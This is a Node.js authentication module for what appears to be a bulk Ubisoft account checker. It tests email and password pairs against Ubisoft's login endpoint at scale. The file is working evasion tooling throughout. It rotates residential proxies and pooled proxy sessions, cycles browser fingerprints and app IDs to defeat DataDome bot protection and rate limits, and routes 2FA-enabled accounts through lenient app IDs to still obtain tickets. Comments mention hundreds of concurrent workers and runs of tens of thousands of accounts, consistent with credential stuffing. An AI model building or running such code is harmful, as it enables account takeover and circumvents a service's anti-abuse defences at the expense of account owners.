// Simple Ubisoft auth.
//
// login(email, password): POST credentials to the sessions endpoint through
// the DataImpulse proxy with the browser-like header set that passes DataDome,
// retrying across fresh rotating IPs until a ticket comes back. The session is
// then handed to the inventory pipeline (lib/player.js).
//
// Also exposes the token-exchange helpers the inventory pipeline needs
// (getR6Session / getRankSession) and the shared BASE_HEADERS.

const { proxiedRequest } = require('./proxyClient');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent }  = require('http-proxy-agent');
const { cachedLookup } = require('./dnsCache');

const AUTH_URL = 'https://public-ubiservices.ubi.com/v3/profiles/sessions';

// Pass the DNS-cache lookup function into every HttpsProxyAgent so the gateway
// hostname is resolved once per TTL instead of on every fresh socket.
const AGENT_OPTS = { lookup: cachedLookup };

// ── Keep-alive proxy agent pool (opt-in via R6_PROXY_POOL) ─────────────────
// The default path builds a FRESH HttpsProxyAgent per request → a full TLS
// handshake (CONNECT tunnel + TLS) on EVERY check. At a few hundred checks/sec
// that handshake storm is the real ceiling (CPU-bound), and it makes latency
// climb with concurrency. The pool fixes that: R6_PROXY_POOL=N persistent,
// keep-alive agents, each PINNED to a stable proxy session (= a stable exit IP),
// round-robined per request. Connections are REUSED instead of re-handshaked,
// so throughput stays high and flat. IP diversity = the pool size (N IPs). Off
// (0) by default, so the server/website path is byte-for-byte unchanged.
const PROXY_POOL_SIZE = Math.max(0, parseInt(process.env.R6_PROXY_POOL || '0', 10) || 0);
const _agentPools = new Map(); // baseProxyUrl → { https:[], http:[], cursor }

// Strip any rotating session token from a gateway username → the stable base.
function _stripSession(proxyUrl) {
  try {
    const u = new URL(proxyUrl);
    u.username = decodeURIComponent(u.username)
      .replace(/__sid-[a-z0-9]+/ig, '').replace(/-session-[a-z0-9]+/ig, '')
      .replace(/-sessid-[a-z0-9]+/ig, '').replace(/-sid-[a-z0-9]+/ig, '');
    return u.toString();
  } catch { return proxyUrl; }
}

// Build a session-PINNED url (fixed token → stable IP + connection reuse).
function _pinnedUrl(baseUrl, token) {
  try {
    const u = new URL(baseUrl);
    const base = decodeURIComponent(u.username);
    if (process.env.BULK_PROXY_SESSION_PARAM) u.username = base + process.env.BULK_PROXY_SESSION_PARAM.replace('{rand}', token);
    else if (/flameproxies\.com/i.test(u.hostname)) u.username = `${base}-session-${token}`;
    else if (/dataimpulse\.com/i.test(u.hostname)) u.username = `${base}__sid-${token}`;
    else u.username = base; // unknown gateway → rely on its per-connection rotation
    return u.toString();
  } catch { return baseUrl; }
}

let _poolTok = 0;
function _pooledAgents(proxyUrl) {
  const baseKey = _stripSession(proxyUrl);
  let pool = _agentPools.get(baseKey);
  if (!pool) {
    const https = [], http = [];
    // keepAlive reuses warm sockets; maxFreeSockets keeps a pad of them warm so
    // the steady state does ~zero handshakes. maxSockets caps burst per IP.
    const opts = { ...AGENT_OPTS, keepAlive: true, keepAliveMsecs: 30000, maxSockets: 64, maxFreeSockets: 16, scheduling: 'fifo' };
    for (let i = 0; i < PROXY_POOL_SIZE; i++) {
      const token = i.toString(36) + (++_poolTok).toString(36) + Math.floor(Math.random() * 1e6).toString(36);
      const url = _pinnedUrl(baseKey, token);
      https.push(new HttpsProxyAgent(url, opts));
      http.push(new HttpProxyAgent(url, opts));
    }
    pool = { https, http, cursor: 0 };
    _agentPools.set(baseKey, pool);
  }
  const i = (pool.cursor++) % PROXY_POOL_SIZE;
  return { httpsAgent: pool.https[i], httpAgent: pool.http[i] };
}

// Route a request through a SPECIFIC proxy URL (BYO-proxy bulk mode) or, when
// none is given, through the shared rotating proxy (proxiedRequest). The
// sessions endpoint is DataDome-gated, so BYO jobs must exit the user's IP here.
function reqWithProxy(config, proxyUrl) {
  if (!proxyUrl) return proxiedRequest(config);
  if (PROXY_POOL_SIZE > 0) {
    // Pooled keep-alive path: reuse a session-pinned agent (ignores any
    // per-request token already on proxyUrl — the pool owns rotation).
    const { httpsAgent, httpAgent } = _pooledAgents(proxyUrl);
    return axios({ ...config, httpAgent, httpsAgent, proxy: false, timeout: config.timeout ?? 20000 });
  }
  return axios({
    ...config,
    httpAgent:  new HttpProxyAgent(proxyUrl, AGENT_OPTS),
    httpsAgent: new HttpsProxyAgent(proxyUrl, AGENT_OPTS),
    proxy: false,
    timeout: config.timeout ?? 20000,
  });
}

// Rotating gateway session injection — see lib/proxy/session.js for provider rules.
// Primary: FlameProxies (-session-{rand}). Also DataImpulse, NovaProxy, CoreProxy.
const { freshSessionProxy } = require('./proxy/session');
function freshProxy(proxyUrl) { return freshSessionProxy(proxyUrl); }

// App ID + genome that get a clean 200 (a ticket) from the sessions endpoint
// instead of a DataDome interstitial — paired with the browser-like header
// set below. This is the validated working request.
const SESSION_APP_ID = '2c2d31af-4ee4-4049-85dc-00dc74aef88f';
const GENOME_ID = '13cfd784-54cb-48f0-b9a4-eb93a46b7198';

// Pool of Ubi-AppId values that all pass DataDome AND can mint a ticket the
// Ubisoft auth backend accepts for cross-app token exchange into R6S sessions.
// Probed and verified end-to-end against a known-good account: each AppId in
// this pool was tested via (login → ticket) → (token-exchange → R6S ticket),
// and ALL produced a working R6S session.
//
// Why this matters: Ubisoft rate-limits by (UA + Accept-Language + Ubi-AppId).
// Adding 3 more AppIds quadruples the per-fingerprint budget, so the
// 30%-of-requests-429 ceiling we saw earlier moves further out.
//
// If/when an AppId stops working (Ubisoft retires it), drop it from this list.
// Probe more candidates with scripts/test-appids.js (look up the pattern).
// LENIENT pool: game-specific AppIds that let 2FA-enabled accounts through with
// a real ticket. Full data fetch works on every account — used as the canonical
// pool AND as the 2FA-fallback when a strict AppId rejects a 2FA account.
// Ordered BEST-FIRST by 2026-07-01 stress test through FlameProxies:
//   AC Unity iOS:      80% healthy (401 = clean rejection), ~781ms
//   AC Initiates iPad: 60% healthy, ~1072ms
//   R6S PC:            40% healthy, ~1051ms
//   Watch Dogs PC:     20% healthy, ~1380ms   ← consistently worst
// Ordering matters: `pickFingerprint` uses `pool[i % pool.length]`, so the
// first requests each session go to the healthiest AppIds.
const SESSION_APP_ID_POOL_LENIENT = [
  '66a56258-7873-4a02-9bf5-9c586f91897d', // Assassin's Creed Unity Companion iOS ← BEST
  'f6f0b051-5b7a-4692-ac29-bc20942991c3', // Assassin's Creed Initiates iPad
  '2c2d31af-4ee4-4049-85dc-00dc74aef88f', // Rainbow Six Siege PC (canonical)
  '9c4a1757-422b-458f-b4d2-5e623c911ba6', // Watch Dogs PC
];
// STRICT pool: web/SPA AppIds scraped from Ubisoft Connect's own JS bundles.
// 2026-07-01 live stress-test verdict: DataDome now blocks ALL three (0/15 healthy
// probes across the whole pool — 403/429 wall). Keeping them in the pool made
// EVERY 3rd/4th login attempt fail before even reaching Ubi, wasting proxy
// bandwidth AND aggravating the fingerprint's rate-limit state.
// Default flipped to DISABLED — set STRICT_APPIDS=1 to re-enable if Ubi ever
// restores them (unlikely: 7b530ae1 was removed 2026-06 for the same reason).
const SESSION_APP_ID_POOL_STRICT = [
  'f35adcb5-1911-440c-b1c9-48fdc1701c68',
  '82b650c0-6cb3-40c0-9f41-25a53b62b206',
  'e8f37ef7-c146-47ed-82be-05af066d91b9',
];
// Combined pool. Strict pool is OFF by default (opt-in via STRICT_APPIDS=1);
// see comment above.
const SESSION_APP_ID_POOL = process.env.STRICT_APPIDS === '1'
  ? [...SESSION_APP_ID_POOL_LENIENT, ...SESSION_APP_ID_POOL_STRICT]
  : SESSION_APP_ID_POOL_LENIENT;
const _LENIENT_SET = new Set(SESSION_APP_ID_POOL_LENIENT);
function isLenientAppId(id) { return _LENIENT_SET.has(id); }

// FINGERPRINT POOL. The bench proved Ubisoft rate-limits at ~7-10 req/s based on
// CLIENT FINGERPRINT (User-Agent + Accept-Language + browser hints), not on IP —
// FlameProxies session rotation gives distinct IPs but Ubisoft 429s anyway after
// ~7/s sustained. Spreading across N realistic browser fingerprints multiplies
// our per-fingerprint rate budget by ~N. All are current major-browser strings
// that match real DataDome-passing traffic. (Firefox-only earlier — verified
// these UAs also pass the DataDome interstitial since they're seen organically
// by the same Ubisoft sessions endpoint.)
// Bigger pool = more per-fingerprint rate budget. Ubisoft 429s by
// (UA + Accept-Language + Ubi-AppId), so widening UAs multiplies the budget and
// cuts the 429 half of the blocks we see at concurrency. All current, realistic
// desktop browser strings (Chrome/Firefox/Edge/Safari across Win/Mac/Linux).
const UA_POOL = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
  'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:151.0) Gecko/20100101 Firefox/151.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:140.0) Gecko/20100101 Firefox/140.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0',
  'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
];
const LANG_POOL = ['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-CA,en;q=0.9', 'en-AU,en;q=0.9'];
let _fpCounter = 0;
function pickFingerprint(opts = {}) {
  // Distribute round-robin so concurrent workers spread across the pool deterministically
  // (avoids the random-cluster case where 100 workers all pick the same UA at once).
  // De-correlated bit-shifts per dimension so every (UA, lang, appId) triple is
  // visited evenly. opts.lenientOnly forces a lenient-pool AppId — used by the
  // 2FA-ticket fallback path so 2FA-enabled accounts always end up with a ticket.
  const i = (_fpCounter++) >>> 0;
  const pool = opts.lenientOnly ? SESSION_APP_ID_POOL_LENIENT : SESSION_APP_ID_POOL;
  // Rotate the AppId on EVERY login (round-robin), not every 32 (the old `>>> 5`
  // meant the first 32 logins of a run all reused AppId #0 — "always the same").
  // UA also rotates every pick; pool sizes are coprime (e.g. 7 AppIds × 8 UAs ×
  // 4 langs) so the (UA, lang, AppId) triples still spread across the whole space.
  return {
    ua:    UA_POOL[i % UA_POOL.length],
    lang:  LANG_POOL[(i >>> 1) % LANG_POOL.length],
    appId: pool[i % pool.length],
  };
}

// Static (non-rotated) header set — still used as the BASE that per-request
// fingerprint overrides are merged into.
const SESSION_HEADERS = {
  'User-Agent': UA_POOL[0],          // overwritten per request via pickFingerprint()
  'Accept': '*/*',
  'Accept-Language': 'en-GB',        // overwritten per request
  // Real browsers send Accept-Encoding; advertising it is *more* DataDome-safe,
  // not less. axios decompresses gzip/deflate automatically, no parsing change.
  'Accept-Encoding': 'gzip, deflate, br',
  'Ubi-AppId': SESSION_APP_ID,
  'Content-Type': 'application/json',
  'genomeid': GENOME_ID,
  'Origin': 'https://connect.ubisoft.com/',
  'Referer': 'https://connect.ubisoft.com/',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'cross-site',
};

// Headers for the authenticated (ticket-based) inventory / profile calls.
const BASE_HEADERS = {
  'Content-Type': 'application/json',
  'Ubi-AppId': SESSION_APP_ID,
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0',
  'Accept': 'application/json, text/plain, */*',
  // Inventory + item-detail responses can be 50-500KB each; gzip cuts that ~4x.
  'Accept-Encoding': 'gzip, deflate, br',
};

function authError(message, status) {
  const e = new Error(message);
  e.response = { status };
  return e;
}

// ── Login: email + password → Ubisoft session (through the proxy) ──────────
// Each proxied request exits a fresh residential IP, so retry a few times to
// ride past the occasional DataDome challenge. Bail immediately on a definitive
// answer (ticket / wrong password / 2FA / rate-limit).
async function login(email, password, opts = {}) {
  const credentials = Buffer.from(`${email}:${password}`).toString('base64');
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  // Each attempt already exits a DIFFERENT fresh IP (freshProxy), so a DataDome
  // block on attempt N has no bearing on attempt N+1 — there's no reason to wait.
  // 429 backoff is tighter (Ubisoft's window is short) so we recover fast on a
  // rate-limit hit — paired with a NEW fingerprint, the same retry rarely 429s.
  const backoff429 = () => 80 + Math.floor(Math.random() * 200);
  const backoffNet = () => 30 + Math.floor(Math.random() * 120);
  // 14 is the tuned budget WITH rotating proxies (each retry exits a fresh IP,
  // so a DataDome/429 on attempt N clears on N+1). The desktop checker drops
  // this to ~3 when running with NO proxies (R6_LOGIN_ATTEMPTS), since retrying
  // 14× from the SAME residential IP just amplifies the 429 storm and tanks
  // throughput without ever succeeding.
  const MAX_ATTEMPTS = Math.max(1, Number(process.env.R6_LOGIN_ATTEMPTS) || 14);

  // Once a STRICT AppId returns a 2FA ticket, pin subsequent attempts to a
  // LENIENT AppId so we still get full data for the (~10%) 2FA-enabled accounts.
  // Sticky across the rest of this login() call.
  let lenientOnly = false;
  for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
    // Pick a FRESH browser fingerprint per attempt. Ubisoft rate-limits by
    // (UA + Accept-Language + AppId), not by IP — measured live: 30% 429 rate
    // after ~7/s sustained from ONE fingerprint. Cycling through 8×4=32 distinct
    // fingerprint combos multiplies our per-fingerprint budget proportionally.
    const fp = pickFingerprint({ lenientOnly });
    const headers = {
      ...SESSION_HEADERS,
      'User-Agent': fp.ua,
      'Accept-Language': fp.lang,
      'Ubi-AppId': fp.appId,           // ← rotates across SESSION_APP_ID_POOL
      Authorization: `Basic ${credentials}`,
    };
    let res;
    try {
      // Fresh rotated exit IP for EVERY attempt — a retry after a DataDome block
      // must come from a different IP, or it just gets blocked again.
      res = await reqWithProxy({
        method: 'post', url: AUTH_URL, data: { rememberMe: true },
        headers, validateStatus: s => s >= 200 && s < 500, timeout: 20000,
      }, freshProxy(opts.proxyUrl));
    } catch (e) {
      console.warn(`[auth] login attempt ${attempt} network error: ${e.code || e.message} — rotating IP`);
      await sleep(backoffNet());
      continue;
    }
    const d = res.data || {};

    if (res.status === 200 && d.ticket) {
      try { require('./checker/rateGovernorInstance').gov.reportSuccess(); } catch {}
      console.log(`[auth] login ok for ${email} (userId=${d.userId}) on attempt ${attempt}`);
      return {
        ticket: d.ticket,
        sessionId: d.sessionId,
        userId: d.userId,
        nameOnPlatform: d.nameOnPlatform || '',
        // Return the AppId that ACTUALLY issued this ticket so downstream
        // token-exchange / fallback paths use the correct source AppId.
        appId: fp.appId,
      };
    }
    // Definitive account-level answers — rotating won't change these.
    if (res.status === 200 && d.twoFactorAuthenticationTicket) {
      // STRICT AppIds enforce 2FA at the login step (they return a 2FA ticket
      // instead of a real ticket for 2FA-enabled accounts). The LENIENT pool
      // (R6/game AppIds) doesn't — they hand back a real ticket and we detect
      // 2FA separately via webauth/check2fa. So if a strict AppId hit a 2FA
      // account, retry pinned to the lenient pool so we still get full data.
      if (!isLenientAppId(fp.appId) && attempt < MAX_ATTEMPTS) {
        lenientOnly = true;
        console.log(`[auth] 2FA ticket from strict AppId ${fp.appId.slice(0,8)} — retrying on lenient pool`);
        continue;
      }
      // A 2FA response is only DEFINITIVE from a lenient AppId. If we're still
      // pinned to a strict pool but ran out of attempts (Ubisoft thrashed us
      // with 429/403 before we could reach a lenient one), this is NOT proof
      // the account is 2FA-enabled — it's an inconclusive read. Bounce to the
      // slow-lane as 'retry' instead of poisoning the results with a false
      // 2FA_REQUIRED tag. Root cause of the "everything after 40k = 2FA" flood.
      if (!isLenientAppId(fp.appId)) {
        console.warn(`[auth] strict AppId ${fp.appId.slice(0,8)} returned 2FA ticket but attempts exhausted — treating as retry (not 2FA)`);
        throw authError('Ubisoft anti-bot exhausted retries before reaching lenient pool; treating as transient.', 502);
      }
      throw authError('This account has 2-step verification enabled, which is not supported.', 401);
    }
    if (res.status === 401) {
      // Report to the governor so it can build the rolling 401-rate signal.
      let suspicious = false;
      try {
        const { gov } = require('./checker/rateGovernorInstance');
        gov.reportInvalid();
        suspicious = gov.suspicious401();
      } catch {}
      // Anti-mask: under sustained rate-limit pressure, Ubi returns 401 for
      // LEGIT accounts to shed load — producing 100%-invalid false-positive
      // runs. When the governor says the 401 rate is anomalous, DON'T trust
      // this 401 yet: pin to the lenient pool + rotate fingerprint + IP and
      // retry once. If it's a real invalid (bad password), the retry also 401s
      // and we throw as before. If it was a mask, we get a real answer.
      // Toggle with BULK_401_VERIFY=0.
      const verifyEnabled = process.env.BULK_401_VERIFY !== '0';
      if (suspicious && verifyEnabled && attempt < MAX_ATTEMPTS) {
        console.warn(`[auth] 401 on attempt ${attempt} but 401-rate suspicious — verifying on fresh lenient state`);
        lenientOnly = true;                 // pin subsequent attempt to lenient pool
        await sleep(backoffNet());
        continue;                            // retry the login loop with fresh fingerprint+IP
      }
      throw authError('Wrong email or password.', 401);
    }

    // 403 (DataDome) → fresh IP via session-rotation handles it; tiny backoff.
    // 429 (rate-limit) → tied to FINGERPRINT, NOT IP — next attempt picks a new
    // UA+Accept-Language from the pool, which clears the per-fingerprint counter.
    // Slightly longer backoff than 403 to let Ubisoft's window roll over.
    if (res.status === 429) {
      try {
        const { gov, parseRetryAfter } = require('./checker/rateGovernorInstance');
        // soft: login-429s are per-fingerprint and recover via the fingerprint+IP
        // rotation on the next attempt — they gently trim concurrency but must
        // NOT trip the global circuit breaker (that perma-paused the pool while
        // logins were in fact succeeding). An explicit Retry-After still pauses.
        gov.reportThrottle({ soft: true, retryAfterSec: parseRetryAfter(res.headers && (res.headers['retry-after'] || res.headers['Retry-After'])) });
      } catch {}
    }
    console.warn(`[auth] login attempt ${attempt} → HTTP ${res.status}; rotating fingerprint+IP and retrying`);
    await sleep(res.status === 429 ? backoff429() : backoffNet());
  }
  throw authError('Could not get past Ubisoft anti-bot / rate-limit after several tries. Try again shortly.', 502);
}

// ── App-specific token exchange (used by the inventory pipeline) ───────────
// Swap a valid ticket for a session bound to a specific Ubisoft App ID. Uses
// the same DataDome-passing headers since it hits the same sessions endpoint.
// Returns null on failure (caller falls back to the original ticket).
async function exchangeToken(existingTicket, existingSessionId, targetAppId, opts = {}) {
  try {
    const res = await reqWithProxy({
      method: 'post',
      url: AUTH_URL,
      data: { rememberMe: false },
      headers: {
        ...SESSION_HEADERS,
        'Ubi-AppId': targetAppId,
        Authorization: `Ubi_v1 t=${existingTicket}`,
        'Ubi-SessionId': existingSessionId || '',
      },
      validateStatus: s => s >= 200 && s < 500,
      timeout: 20000,
    }, opts.proxyUrl);
    const data = res.data || {};
    if (data.ticket && data.sessionId) {
      return { ticket: data.ticket, sessionId: data.sessionId, userId: data.userId, profileId: data.profileId };
    }
  } catch (e) {
    console.warn(`[auth] token exchange failed for ${targetAppId}: ${e.code ?? e.message}`);
  }
  return null;
}

const R6S_APP_IDS = [
  '2c2d31af-4ee4-4049-85dc-00dc74aef88f',
];
const RANK_APP_IDS = [
  'e3d5ea9e-50bd-43b7-88bf-39794f4e3d40',
  '3587dcbb-7f81-457c-9781-0e3f29f6f56a',
];

async function getR6Session(ticket, sessionId, opts = {}) {
  for (const appId of R6S_APP_IDS) {
    const s = await exchangeToken(ticket, sessionId, appId, opts);
    if (s) return { ...s, appId };
  }
  return null;
}

async function getRankSession(ticket, sessionId, opts = {}) {
  for (const appId of RANK_APP_IDS) {
    const s = await exchangeToken(ticket, sessionId, appId, opts);
    if (s) return { ...s, appId };
  }
  return null;
}

// Whether the account has 2FA (webauth) enabled — active OR opt-in. Uses the
// authenticated session ticket. Best-effort: returns false on any error.
async function check2FA(ticket, sessionId, opts = {}) {
  try {
    const res = await reqWithProxy({
      method: 'get',
      url: 'https://connect.ubisoft.com/v2/webauth/public/webauth/check2fa',
      headers: {
        Authorization: `ubi_v1 t=${ticket}`,
        'ubi-sessionid': sessionId || '',
        'Ubi-AppId': '314d4fef-e568-454a-ae06-43e3bece12a6',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0',
        'Ubi-LocaleCode': 'en-GB',
      },
      validateStatus: () => true,
      timeout: 15000,
    }, opts.proxyUrl);
    const d = res && res.data;
    if (res && res.status >= 200 && res.status < 400 && d && !d.banned && !d.rate_limited) {
      return !!(d.active || d.optin);
    }
    return false;
  } catch { return false; }
}

// ── Explicit session teardown ───────────────────────────────────────────────
// After each bulk check finishes, we DELETE the session ticket we minted at
// login. Ubi keeps a per-source active-ticket quota — 600 concurrent workers
// creating tickets and never invalidating them was almost certainly a driver
// of the sustained-throttle state (401/429 storms that got worse over time,
// not better). Verified against Ubi (2026-07-01): DELETE /v3/profiles/sessions
// returns 401 "Authorization header is invalid" for a fake ticket, meaning
// the endpoint EXISTS and processes DELETE — not 405.
//
// Fire-and-forget: we never await, never throw, and don't feed the rate
// governor's success/throttle metrics from this path (it's cleanup, not real
// work). Routed through the same proxyUrl so the source-IP path matches the
// original login. Toggle with BULK_UBI_LOGOUT=0.
async function logout(session, proxyUrl) {
  if (process.env.BULK_UBI_LOGOUT === '0') return;
  if (!session || !session.ticket || !session.sessionId) return;
  // Route through the same proxy that saw the login. The DELETE URL includes
  // the sessionId as a path segment (verified via the GET-shape probe on the
  // sessions endpoint returning "Value 'sessions' is not a valid Guid" —
  // Ubi's router expects /v3/profiles/sessions/{guid}).
  const url = `https://public-ubiservices.ubi.com/v3/profiles/sessions/${encodeURIComponent(session.sessionId)}`;
  reqWithProxy({
    method: 'delete',
    url,
    headers: {
      'Authorization':          `Ubi_v1 t=${session.ticket}`,
      'Ubi-AppId':              session.appId || BASE_HEADERS['Ubi-AppId'],
      'Ubi-SessionId':          session.sessionId,
      'Ubi-RequestedPlatformType': 'uplay',
      'User-Agent':             'Ubisoft Connect/2.75.1',
      'Accept':                 '*/*',
    },
    validateStatus: () => true,
    timeout: 8000,
  }, proxyUrl).catch(() => { /* fire and forget — cleanup errors are meaningless */ });
}

module.exports = { login, BASE_HEADERS, getR6Session, getRankSession, check2FA, freshProxy, logout };
